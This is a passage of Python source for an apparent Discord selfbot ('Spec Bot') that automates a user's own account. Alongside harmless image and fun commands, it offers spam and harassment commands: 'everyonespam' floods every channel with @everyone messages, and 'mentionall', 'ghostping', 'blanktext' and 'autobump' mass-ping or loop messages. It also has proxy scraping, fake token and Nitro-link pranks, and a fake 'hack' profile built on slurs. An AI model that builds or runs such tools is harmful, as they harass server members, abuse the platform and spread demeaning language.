            print(f"{Fore.RED}[-] {Fore.WHITE}Error: Status Code: {response.status_code}")
        return


@Reluctant.command()
async def validate(ctx, host):
    await ctx.message.delete()
    try:
        response = requests.get(f'https://reluctant.one/tools/ipvalidator.php?key=testkey&host={host}').text
        response = response.replace('<br>', '\n')
        embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)

        embed.add_field(name=f"**Response**", value=f"```{response}```", inline=False)
        embed.add_field(name=f"**Host**", value=f"```{host}```", inline=False)
        embed.set_footer(text="Success ")
        await ctx.send(embed=embed)
    except:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"**Response**", value=f"```Status: {response.status_code}```", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: Status Code: {response.status_code}")
        return


@Reluctant.command()
async def domaintoip(ctx, domain):
    await ctx.message.delete()
    try:
        response = requests.get(f'https://reluctant.one/tools/domain2ip.php?key=testkey&domain={domain}').text
        response = response.replace('<br>', '\n')
        embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)

        embed.add_field(name=f"**Response**", value=f"```{response}```", inline=False)
        embed.add_field(name=f"**Domain**", value=f"```{domain}```", inline=False)
        embed.set_footer(text="Success ")
        await ctx.send(embed=embed)
    except:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"**Response**", value=f"```Status: {response.status_code}```", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: Status Code: {response.status_code}")
        return


@Reluctant.command()
async def iptodomain(ctx, host):
    await ctx.message.delete()
    try:
        response = requests.get(f'https://reluctant.one/tools/ip2domain.php?key=testkey&host={host}').text
        response = response.replace('<br>', '\n')
        embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)

        embed.add_field(name=f"**Response**", value=f"```{response}```", inline=False)
        embed.add_field(name=f"**Domain**", value=f"```{host}```", inline=False)
        embed.set_footer(text="Success ")
        await ctx.send(embed=embed)
    except:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"**Response**", value=f"```Status: {response.status_code}```", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: Status Code: {response.status_code}")
        return


# Tool Commands End

# Main Commands Start


@Reluctant.command()
async def pfp(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format=format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file=discord.File(file, f"Avatar.{format}"))


@Reluctant.command()
async def servericon(ctx):
    await ctx.message.delete()
    servlogo = ctx.guild.icon_url
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", colour=0xff0000)
    embed.set_image(url=servlogo)
    embed.set_footer(text="Server Icon ")
    await ctx.send(embed=embed)


@Reluctant.command()
async def roleinfo(ctx, *, role: discord.Role):
    await ctx.message.delete()
    guild = ctx.guild
    since_created = (ctx.message.created_at - role.created_at).days
    role_created = role.created_at.strftime("%d %b %Y %H:%M")
    created_on = "{} ({} days ago)".format(role_created, since_created)
    users = len([x for x in guild.members if role in x.roles])
    if str(role.colour) == "#0xff0000":
        colour = "default"
        color = ("#%06x" % random.randint(0, 0xff0000))
        color = int(colour[1:], 16)
    else:
        colour = str(role.colour).upper()
        color = role.colour
    em = discord.Embed(colour=color)
    em.set_author(name=f"Name: {role.name}"
                       f"\nRole ID: {role.id}")
    em.add_field(name="Users", value=users)
    em.add_field(name="Mentionable", value=role.mentionable)
    em.add_field(name="Hoist", value=role.hoist)
    em.add_field(name="Position", value=role.position)
    em.add_field(name="Managed", value=role.managed)
    em.add_field(name="Colour", value=colour)
    em.add_field(name='Creation Date', value=created_on)
    await ctx.send(embed=em)


def httpproxy():
    file2 = open("Scraped Proxies\http-proxies.txt", "r+")
    file2.truncate(0)
    file2.close()
    file = open("Scraped Proxies\http-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Scraped HTTP Proxy: {p}")

def httpsproxy():
    file2 = open("Scraped Proxies\https-proxies.txt", "r+")
    file2.truncate(0)
    file2.close()
    file = open("Scraped Proxies\https-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=https&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
             proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Scraped HTTPS Proxy: {p}")

def socks4proxy():
    file2 = open("Scraped Proxies\socks4-proxies.txt", "r+")
    file2.truncate(0)
    file2.close()
    file = open("Scraped Proxies\socks4-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Scraped Socks4 Proxy: {p}")

def socks5proxy():
    file2 = open("Scraped Proxies\socks5-proxies.txt", "r+")
    file2.truncate(0)
    file2.close()
    file = open("Scraped Proxies\socks5-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Scraped Socks5 Proxy: {p}")


@Reluctant.command()
async def proxyscrape(ctx):
    await ctx.message.delete()
    threading.Thread(target=httpproxy).start()
    threading.Thread(target=httpsproxy).start()
    threading.Thread(target=socks4proxy).start()
    threading.Thread(target=socks5proxy).start()


@Reluctant.command()
async def loaded(ctx):
    await ctx.message.delete()
    file = open("proxies.txt", "r")
    counter = 0
    Content = file.read()
    CoList = Content.split("\n")
    for i in CoList:
        if i:
            counter += 1
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
    embed.add_field(name=f"```Amount Of Proxies Loaded```", value=f"{counter}", inline=False)
    embed.set_footer(text="Proxies ")
    await ctx.send(embed=embed)


@Reluctant.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Reluctant.user).map(
            lambda m: m):
        try:
            await message.delete()
        except:
            pass


@Reluctant.command()
async def clear(ctx):
    await ctx.message.delete()
    await ctx.send('ﾠﾠ' + '\n' * 400 + 'ﾠﾠ')


@Reluctant.command()
async def autobump(ctx, channelid: int, minutes: int):
    await ctx.message.delete()
    channel = Reluctant.get_channel(channelid)
    amt = minutes * 60
    for i in range(400):
        await channel.send("!d bump")
        await asyncio.sleep(amt)


@Reluctant.command()
async def massreact(ctx):
    await ctx.message.delete()
    emote = ['✔', '🐒', '✨', '🔥', '❤', '🎃', '🏈', '🏀', '⚽']
    messages = await ctx.message.channel.history(limit=1).flatten()
    for message in messages:
        for emoji in emote:
            await message.add_reaction(emoji)


autoafk = False
autoreply = False

@Reluctant.command()
async def afkon(ctx):
    await ctx.message.delete()
    global autoafk
    autoafk = True
    print(f"{Fore.GREEN}[-] {Fore.WHITE}AFK Status: On")


@Reluctant.command()
async def afkoff(ctx):
    await ctx.message.delete()
    global autoafk
    autoafk = False
    print(f"{Fore.GREEN}[-] {Fore.WHITE}AFK Status: Off")


# Main Commands End

# Fun Commands (Page 1)


@Reluctant.command()
async def coinflip(ctx):
    lista = ['head', 'tails']
    coin = random.choice(lista)
    try:
        if coin == 'head':
            embed = discord.Embed(color=0xff0000, title="Heads", timestamp=datetime.utcfromtimestamp(time.time()))
            embed.set_thumbnail(url="https://webstockreview.net/images/coin-clipart-dime-6.png")
            embed.set_footer(text="Coinflip")
            await ctx.send(embed=embed)
        else:
            embed = discord.Embed(color=0xff0000, title="Tails", timestamp=datetime.utcfromtimestamp(time.time()))
            embed.set_thumbnail(url="https://www.nicepng.com/png/full/146-1464848_quarter-tail-png-tails-on-a-coin.png")
            embed.set_footer(text="Coinflip")
            await ctx.send(embed=embed)
    except discord.HTTPException:
        if coin == 'head':
            await ctx.send("Coinflip: **Heads**")
        else:
            await ctx.send("Coinflip: **Tails**")


@Reluctant.command()
async def tweet(ctx, username: str, *, message: str):
    await ctx.message.delete()
    try:
        async with aiohttp.ClientSession() as cs:
            async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
                res = await r.json()
                em = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
                em.set_footer("Tweet ")
                em.set_image(url=res["message"])
                await ctx.send(embed=em)
    except Exception as e:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"```Error```", value="Status:", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error")
        return


@Reluctant.command()
async def embed(ctx, *, text: str = None):
    await ctx.message.delete()
    embed = discord.Embed(title="Spec Bot", description=f"{text}", color=0xff0000)
    
    embed.set_footer(text="Custom Embed ")
    try:
        await ctx.send(embed=embed)
    except discord.HTTPException:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"```Embeds Are Turned Off```", value="Cant Run The Command", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Error: Embeds Are Turned Off.")
        return


@Reluctant.command()
async def ascii(ctx, *, text):
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```' + r + '```') > 2000:
        return
    await ctx.send(f"```{r}```")


m_numbers = [
    ":one:",
    ":two:",
    ":three:",
    ":four:",
    ":five:",
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]


@Reluctant.command()
async def minesweeper(ctx, size: int = 5):
    await ctx.message.delete()
    size = max(min(size, 8), 2)
    bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
    message = "**Click to play**:\n"
    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in m_offets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(m_numbers[count - 1])
            message += tile
        message += "\n"
    await ctx.send(message)


@Reluctant.command(aliases=['slots'])
async def slot(ctx):
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if (a == b == c):
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} All matchings, you won!"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} 2 in a row, you won!"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict(
            {"title": "Slot machine", "description": f"{slotmachine} No match, you lost"}))


@Reluctant.command(aliases=['bitcoin'])
async def btc(ctx):
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`', color=0xff0000)
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    await ctx.send(embed=em)


@Reluctant.command(aliases=['dogecoin'])
async def doge(ctx):
        await ctx.message.delete()
        r = requests.get("https://min-api.cryptocompare.com/data/price?fsym=DOGE&tsyms=USD,EUR")
        kekistan = r.json()
        eur = kekistan['EUR']
        usd = kekistan['USD']
        embedic = discord.Embed(description=f'EUR: `{str(eur)}€`\nUSD: `{str(usd)}$`', color=0xff0000)
        embedic.set_author(name='Dogecoin', icon_url='https://cdn.coindoo.com/2019/10/dogecoin-logo.png')
        await ctx.send(embed=embedic)


@Reluctant.command()
async def dog(ctx):
    await ctx.message.delete()
    r = requests.get("https://dog.ceo/api/breeds/image/random").json()
    em = discord.Embed()
    em.set_image(url=str(r['message']))
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(str(r['message']))


@Reluctant.command()
async def fox(ctx):
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    em = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    em.set_footer("Random Fox Image ")
    em.set_image(url=r["image"])
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(r['image'])


@Reluctant.command()
async def panda(ctx):
    await ctx.message.delete()
    r = requests.get("https://some-random-api.ml/img/panda").json()
    embed = discord.Embed(color=0xff0000)
    embed.set_author(name="Random Panda", icon_url="https://cdn.freebiesupply.com/logos/large/2x/panda-7-logo-png-transparent.png")
    embed.set_image(url=str(r["link"]))
    await ctx.send(embed=embed)


@Reluctant.command()
async def meme(ctx):
    await ctx.message.delete()
    r = requests.get("https://some-random-api.ml/meme").json()
    embed = discord.Embed(color=0xff0000)
    embed.set_author(name="Random Meme", icon_url="https://freepngimg.com/thumb/internet_meme/3-2-troll-face-meme-png-thumb.png")
    embed.set_image(url=str(r["image"]))
    await ctx.send(embed=embed)


def nitorandom():
    code = "".join(random.choices(string.ascii_letters + string.digits, k=16))
    return f"https://discord.gift/{code}"


@Reluctant.command()
async def randomnitro(ctx):
    await ctx.message.delete()
    await ctx.send(nitorandom())


@Reluctant.command()
async def hug(ctx, user: discord.User = None):
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/hug")
        res = r.json()
        embed = discord.Embed(description=f"**{ctx.author.mention} hugged {user.mention}!**", color=0x0000)
        embed.set_image(url=res["url"])
        await ctx.send(embed=embed)


@Reluctant.command()
async def slap(ctx, user: discord.User = None):
        await ctx.message.delete()
        r = requests.get("https://nekos.life/api/v2/img/slap")
        res = r.json()
        embed = discord.Embed(description=f"**{ctx.author.mention} slapped {user.mention}!**", color=0x0000)
        embed.set_image(url=res["url"])
        await ctx.send(embed=embed)


@Reluctant.command()
async def blanktext(ctx, amount: int, *, message="‎"):
    await ctx.message.delete()
    for i in range(amount):
        await ctx.send(message)


@Reluctant.command()
async def everyonespam(ctx, *, message):
    await ctx.message.delete()
    print(f'''{Fore.GREEN}[-] {Fore.WHITE}Spammed: @everyone {message}''' + Fore.WHITE)
    for channel in list(ctx.guild.channels):
        try:
            for _i in range(20):
                await channel.send(f"@everyone {message}")
        except:
            pass


@Reluctant.command()
async def faketoken(ctx, user: discord.User = None):
    await ctx.message.delete()
    list = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U",
            "V", "W", "X", "Y", "Z", "_"'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o',
            'p', 'q', 'r', 's', 't', 'u',
            'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    token = random.choices(list, k=59)
    print(token)
    if user is None:
        user = ctx.author
        await ctx.send(user.mention + "'s token is " + ''.join(token))
    else:
        await ctx.send(user.mention + "'s token is " + "".join(token))


@Reluctant.command()
async def createpoll(ctx, *, message):
    await ctx.message.delete()
    try:
        embed = discord.Embed(title=f"Spec Bot", description=f"`{message}`",color=0xff0000)

        embed.set_footer(text="Reluctant Poll ")
        a = await ctx.send(embed=embed)
    except:
        a = await ctx.send(message)

    await a.add_reaction("👍")
    await a.add_reaction("👎")


@Reluctant.command(aliases=["encode","base64","base64encode","encodebase64"])
async def encrypt(ctx,*,message):
    msg = base64.b64encode(str(message).encode())
    final = str(msg).replace("'","")
    await ctx.message.edit(content=f"`{final[1:]}`")


@Reluctant.command(aliases=["decode","base64decode","decodebase64"])
async def decrypt(ctx,*,message):
    msg = base64.b64decode(str(message).encode())
    final = str(msg).replace("'","")
    await ctx.message.edit(content=f"`{final[1:]}`")


@Reluctant.command()
async def fuckpfp(ctx,  memb : discord.Member=None,intense="5"):
    if memb == None:
        memb = ctx.message.author
    finalurl = str(memb.avatar_url)
    finalurl = finalurl.replace("gif","png")
    finalurl = finalurl.replace("webp","png")
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=magik&image={finalurl}&intensity={intense}").text
    j = json.loads(data)
    magicwoah = j['message']
    embed=discord.Embed(title="Spec Bot", description="Made by Clumsy", colour=0xff0000)
    embed.set_image(url=magicwoah)
    embed.set_footer(text="Fuck Profile Picture ")
    await ctx.message.edit(content="",embed=embed)


@Reluctant.command()
async def changemymind(ctx,*,text):
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=changemymind&text={text}").text
    j = json.loads(data)
    changemymindimage = j['message']
    embed=discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    embed.set_image(url=changemymindimage)
    embed.set_footer(text="Change My Mind ")
    await ctx.message.edit(content="",embed=embed)


@Reluctant.command()
async def iphonex(ctx,  memb : discord.Member=None):
    if memb == None:
        memb = ctx.message.author

    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=iphonex&url={memb.avatar_url}").text
    j = json.loads(data)
    phonephoto = j['message']

    embed=discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    embed.set_image(url=phonephoto)
    embed.set_footer(text="iPhone X ")
    await ctx.message.edit(content="",embed=embed)


# Fun Commands (Page 1) End

# Fun Commands (Page 2) Start


@Reluctant.command()
async def captcha(ctx,  memb : discord.Member=None):
    if memb == None:
        memb = ctx.message.author
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=captcha&url={memb.avatar_url}&username={memb.name}").text
    j = json.loads(data)
    captcha = j['message']
    embed=discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    embed.set_image(url=captcha)
    embed.set_footer(text="Captcha ")
    await ctx.message.edit(content="",embed=embed)


@Reluctant.command()
async def kannagen(ctx,*,kannatext=None):
    if kannatext == None:
        kannatext = f"{ctx.message.author.name} the format is {prefix.strip()}kannagen [message]"
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=kannagen&text={kannatext}").text
    j = json.loads(data)
    kannaimg = j['message']

    embed=discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    embed.set_image(url=kannaimg)
    embed.set_footer(text="Kannagen ")
    await ctx.message.edit(content="",embed=embed)


@Reluctant.command()
async def phcomment(ctx, user: str = None, *, args=None):
    await ctx.message.delete()
    if user is None or args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://nekobot.xyz/api/imagegen?type=phcomment&text=" + args + "&username=" + user + "&image=" + str(
        ctx.author.avatar_url_as(format="png"))
    r = requests.get(endpoint)
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["message"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(
                file=discord.File(file, f"ph_comment.png"))
    except:
        await ctx.send(res["message"])


@Reluctant.command()
async def calculate(ctx, number1: int, type, number2: int):
    await ctx.message.delete()
    if type == "+":
        total = number1 + number2
    elif type == "-":
        total = number1 - number2
    elif type == "/":
        total = number1 / number2
    elif type == "*":
        total = number1 * number2
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
    embed.add_field(name=f"{number1} {type} {number2}", value=f"Answer = {total}", inline=True)
    embed.set_footer(text="Calculator ")
    await ctx.send(embed=embed)


async def crashgif(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", colour=0xff0000)
    embed.set_image(url='https://cdn.discordapp.com/attachments/855105819188133948/860382149072519188/AccomplishedTinyAustraliansilkyterrier-size_restricted.gif')
    embed.set_footer(text="Crash Gif ")
    await ctx.send(embed=embed)


@Reluctant.command()
async def mentionall(ctx, message):
    await ctx.message.delete()
    memberlist = ''
    for member in ctx.guild.members:
        memberlist += f"<@{member.id}>"
    await ctx.send(f" {message} {memberlist}")


@Reluctant.command()
async def pingweb(ctx, website=None):
    await ctx.message.delete()
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[-]: {Fore.WHITE}{e}" + Fore.RESET)
        if r == 404:
            await ctx.send(f'Site Is Down! Status Code: {r}', delete_after=3)
        else:
            await ctx.send(f'Site Is Up! Status Code: {r}', delete_after=3)


@Reluctant.command()
async def ghostping(ctx, amount: int, *, user):
    await ctx.message.delete()
    for i in range(amount):
        await ctx.send(user)
        async for message in ctx.message.channel.history(limit=1).filter(lambda m: m.author == Reluctant.user).map(
                lambda m: m):
            try:
                await message.delete()
            except:
                pass


@Reluctant.command()
async def crashgif(ctx):
    await ctx.message.delete()
    embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", colour=0xff0000)
    embed.set_image(url='https://cdn.discordapp.com/attachments/855105819188133948/860382149072519188/AccomplishedTinyAustraliansilkyterrier-size_restricted.gif')
    embed.set_footer(text="Crash Gif ")
    await ctx.send(embed=embed)


@Reluctant.command()
async def rainbowrole(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    roleVer = 'Rainbow Role'
    user = ctx.message.author
    roletogive = roleVer
    if get(ctx.guild.roles, name="Rainbow Role"):
        try:
            await user.add_roles(discord.utils.get(user.guild.roles, name=roletogive))
        except Exception as e:
            print(f"{Fore.RED}[-] {Fore.WHITE}Error")
        roleshit = discord.utils.get(ctx.guild.roles, name="Rainbow Role")
        await roleshit.edit(color=0xff0000, reason="Color Change")  #RED
        time.sleep(0.7)
        await roleshit.edit(color=0xffa500, reason="Color Change")  #ORANGE
        time.sleep(0.7)
        await roleshit.edit(color=0xffff00, reason="Color Change")  #YELLOW
        time.sleep(0.7)
        await roleshit.edit(color=0x00ff00, reason="Color Change") #GREEN
        time.sleep(0.7)
        await roleshit.edit(color=0x0000ff, reason="Color Change")  #BLUE
        time.sleep(0.7)
        await roleshit.edit(color=0x6a0dad, reason="Color Change")  #PURPLE
        time.sleep(0.7)
        await roleshit.edit(color=0xffc0cb, reason="Color Change")  #PINK
        time.sleep(0.7)
        await roleshit.edit(color=0xff0000, reason="Color Change")  # RED
        time.sleep(0.7)
        await roleshit.edit(color=0xffa500, reason="Color Change")  # ORANGE
        time.sleep(0.7)
        await roleshit.edit(color=0xffff00, reason="Color Change")  # YELLOW
        time.sleep(0.7)
        await roleshit.edit(color=0x00ff00, reason="Color Change")  # GREEN
        time.sleep(0.7)
        await roleshit.edit(color=0x0000ff, reason="Color Change")  # BLUE
        time.sleep(0.7)
        await roleshit.edit(color=0x6a0dad, reason="Color Change")  # PURPLE
        time.sleep(0.7)
        await roleshit.edit(color=0xffc0cb, reason="Color Change")  # PINK
        time.sleep(0.7)
        await roleshit.edit(color=0xff0000, reason="Color Change")  # RED
    else:
        await guild.create_role(name="Rainbow Role", colour=0xff0000)
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Created Rainbow Role. Please Run The Command Again")


@Reluctant.command()
async def reverse(ctx, *, message):
    await ctx.message.delete()
    message = message[::-1]
    await ctx.send(message)


@Reluctant.command(pass_context=True)
async def cyclenick(ctx, *, text):
    await ctx.message.delete()
    global cycling
    cycling = True
    while cycling:
        name = ""
        for letter in text:
            name = name + letter
            await ctx.message.author.edit(nick=name)


@Reluctant.command()
async def stopnick(ctx):
    await ctx.message.delete()
    global cycling
    cycling = False


@Reluctant.command()
async def reversepfp(ctx, user: discord.Member = None):
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    try:
        em = discord.Embed(title="Spec Bot", description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}", color=0xff0000)
        em.set_image(url="https://media.discordapp.net/attachments/909473795738316833/909474632535511060/ed91c4cd.png")
        em.set_footer(text="Reverse Profile Picture ")
        await ctx.send(embed=em)
    except Exception as e:
        if error_style == "embeds":
            embed = discord.Embed(title="Spec Bot", description="Made by Clumsy", color=0xff0000)
    
            embed.add_field(name=f"```Response```", value=f"Status: {e}", inline=False)
            embed.set_footer(text="Error ")
            await ctx.send(embed=embed)
        elif error_style == "console":
            print(f"{Fore.RED}[-] {Fore.WHITE}Unknown Error. Response: {e}")
        return


# Fun Commands (Page 2) End

# Animated Commands Start


@Reluctant.command()
async def fakevirus(ctx):
        list = (
            f"``[▓▓▓                    ] / trojan-virus.exe Packing files.``",
            f"``[▓▓▓▓▓▓▓                ] - trojan-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓           ] \ trojan-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓         ] | trojan-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ] / trojan-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ] - trojan-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] \ trojan-virus.exe Packing files..``",
            f"``Successfully downloaded trojan-virus.exe``",
            "``Injecting virus.   |``",
            "``Injecting virus..  /``",
            "``Injecting virus... -``",
            f"``Successfully Injected trojan-virus.exe to server.``",
        )
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)


@Reluctant.command()
async def table(ctx):
    list = (
        "`(\°-°)\  ┬─┬`",
        "`(\°□°)\  ┬─┬`",
        "`(-°□°)-  ┬─┬`",
        "`(╯°□°)╯    ]`",
        "`(╯°□°)╯     ┻━┻`",
         "`(╯°□°)╯       [`",
        "`(╯°□°)╯          ┬─┬`",
        "`(╯°□°)╯                 ]`",
        "`(╯°□°)╯                  ┻━┻`",
        "`(╯°□°)╯                         [`",
        "`(\°-°)\                               ┬─┬`",
    )
    for i in list:
        await asyncio.sleep(1.5)
        await ctx.message.edit(content=i)


@Reluctant.command()
async def boom( ctx):
    list = (
        "```THIS MESSAGE WILL SELFDESTRUCT IN 5```",
        "```THIS MESSAGE WILL SELFDESTRUCT IN 4```",
        "```THIS MESSAGE WILL SELFDESTRUCT IN 3```",
        "```THIS MESSAGE WILL SELFDESTRUCT IN 2```",
        "```THIS MESSAGE WILL SELFDESTRUCT IN 1```",
        "```THIS MESSAGE WILL SELFDESTRUCT IN 0```",
        "💣",
        "💥",
    )
    for i in list:
        await asyncio.sleep(1.5)
        await ctx.message.edit(content=i)


@Reluctant.command()
async def hack(ctx, user: discord.User = None):
    await ctx.message.delete()
    gender = ["Male", "Female", "Trans", "Other", "Retard"]
    age = str(random.randrange(10, 25))
    height = ['4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"', '5\'1\"', '5\'2\"', '5\'3\"',
              '5\'4\"', '5\'5\"',
              '5\'6\"', '5\'7\"', '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"', '6\'3\"',
              '6\'4\"', '6\'5\"',
              '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"', '6\'10\"', '6\'11\"']
    weight = str(random.randrange(60, 300))
    hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
    skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
    religion = ["Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"]
    sexuality = ["Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"]
    education = ["High School", "College", "Middle School", "Elementary School", "Pre School",
                 "Retard never went to school LOL"]
    ethnicity = ["White", "African American", "Asian", "Latino", "Latina", "American", "Mexican", "Korean", "Chinese",
                 "Arab", "Italian", "Puerto Rican", "Non-Hispanic", "Russian", "Canadian", "European", "Indian"]
    occupation = ["Retard has no job LOL", "Certified discord retard", "Janitor", "Police Officer", "Teacher",
                  "Cashier", "Clerk", "Waiter", "Waitress", "Grocery Bagger", "Retailer", "Sales-Person", "Artist",
                  "Singer", "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer", "Mechanic", "Carpenter",
                  "Electrician", "Lawyer", "Doctor", "Programmer", "Software Engineer", "Scientist"]
    salary = ["Retard makes no money LOL", "$" + str(random.randrange(0, 1000)), '<$50,000', '<$75,000', "$100,000",
              "$125,000", "$150,000", "$175,000",
              "$200,000+"]
